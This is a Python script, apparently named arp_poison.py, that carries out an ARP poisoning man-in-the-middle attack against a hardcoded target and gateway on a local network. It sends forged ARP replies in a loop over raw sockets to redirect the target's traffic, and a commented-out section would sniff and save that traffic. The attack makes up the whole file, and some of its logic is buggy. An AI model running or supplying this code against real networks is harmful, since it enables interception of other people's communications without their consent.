from scapy.all import *
import os
import signal
import sys
import threading
import time
import re
import socket
import binascii
import fcntl
import netifaces as ni
from struct import pack
from uuid import getnode

#ARP Poison parameters
from scapy.layers.l2 import ARP

gateway_ip_str = "192.168.0.1"
target_ip_str = "192.168.0.104"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 0


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])


def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])


def mac_to_int(mac):
    res = re.match('^((?:(?:[0-9a-f]{2}):){5}[0-9a-f]{2})$', mac.lower())
    if res is None:
        raise ValueError('invalid mac address')
    return int(res.group(0).replace(':', ''), 16)

def int_to_mac(macint):
    if type(macint) != int:
        raise ValueError('invalid integer')
    return ':'.join(['{}{}'.format(a, b)
                     for a, b
                     in zip(*[iter('{:012x}'.format(macint))]*2)])

def send_arp_packet(ip_dest, mac_dest, ip_local, mac_local):
    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    raw.bind(('eth0', socket.htons(0x0806)))

    # Ethernet Header
    protocol = 0x0806  # 0x0806 protocol to ARP
    ethernet_header = struct.pack("!6s6sH", mac_dest, mac_local, protocol)

    # ARP header

    type_hardware = 1
    type_protocol = 0x0800  # IPV4
    size_addr_hardware = 6
    size_addr_protocol = 4
    operation = 2

    arp_addr = struct.pack("!HHBBH6s4s6s4s", type_hardware, type_protocol,
                           size_addr_hardware, size_addr_protocol, operation,
                           mac_local, ip_local, mac_dest, ip_dest)
    packet = ethernet_header + arp_addr

    while True:
        print(packet)
        time.sleep(1)
        raw.send(packet)


    # s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    # s.bind(('eth0', 0))
    #
    # ARP_FRAME = [
    #     pack('!H', 0x0001),  # HRD
    #     pack('!H', 0x0800),  # PRO
    #     pack('!B', 0x06),  # HLN
    #     pack('!B', 0x04),  # PLN
    #     pack('!H', 0x0001),  # OP
    #     pack('!6B', *sender_mac),  # SHA
    #     pack('!4B', *sender_ip),  # SPA
    #     pack('!6B', *(0x00,) * 6),  # THA
    #     pack('!4B', *dest_ip),  # TPA
    # ]
    # print(b''.join(ARP_FRAME))
    # s.send(b''.join(ARP_FRAME))
    # s.close()


#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

# #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
# #correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, ip_local,_mac_local):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send_arp_packet(gateway_ip, gateway_mac, ip_local, mac_local)
            send_arp_packet(target_ip, target_mac, ip_local, mac_local)
            # send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            # send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        # restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


# Start the script
print("[*] Starting script: arp_poison.py")
print(f"[*] Gateway IP address: {gateway_ip_str}")
print(f"[*] Target IP address: {target_ip_str}")

# gateway_ip = [int(x) for x in gateway_ip_str.split('.')]
# target_ip = [int(x) for x in target_ip_str.split('.')]
gateway_ip = socket.inet_aton(gateway_ip_str)
target_ip = socket.inet_aton(target_ip_str)

# gateway_mac_int = mac_to_int(get_mac(gateway_ip_str))
# gateway_mac = [int(("%x" % gateway_mac_int)[i:i + 2], 16) for i in range(0, 12, 2)]
gateway_mac = binascii.unhexlify(get_mac(gateway_ip_str).replace(':', ''))
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

# target_mac_int = mac_to_int(get_mac(target_ip_str))
# target_mac = [int(("%x" % target_mac_int)[i:i + 2], 16) for i in range(0, 12, 2)]
target_mac = binascii.unhexlify(get_mac(target_ip_str).replace(':', ''))
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")

print(f"[*] Local IP address: {ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']}")
print(f"[*] Local MAC address: {getHwAddr('eth0')}")
print(f"[*] Gateway MAC address: {get_mac(gateway_ip_str)}")
print(f"[*] Target MAC address: {get_mac(target_ip_str)}")

ip_local = socket.inet_aton(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
mac_local = binascii.unhexlify(getHwAddr('eth0').replace(':', ''))

# print(gateway_mac)
# print(gateway_ip)
# print(socket.inet_aton(target_ip_str))
# print(struct.unpack('BBBB', socket.inet_aton(target_ip_str)))
#ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac, ip_local, mac_local))
poison_thread.start()

# #Sniff traffic and write to file. Capture is filtered on target machine
# try:
#     sniff_filter = "ip host " + target_ip
#     print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
#     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
#     wrpcap(target_ip + "_capture.pcap", packets)
#     print(f"[*] Stopping network capture..Restoring network")
#     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
# except KeyboardInterrupt:
#     print(f"[*] Stopping network capture..Restoring network")
#     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
#     sys.exit(0)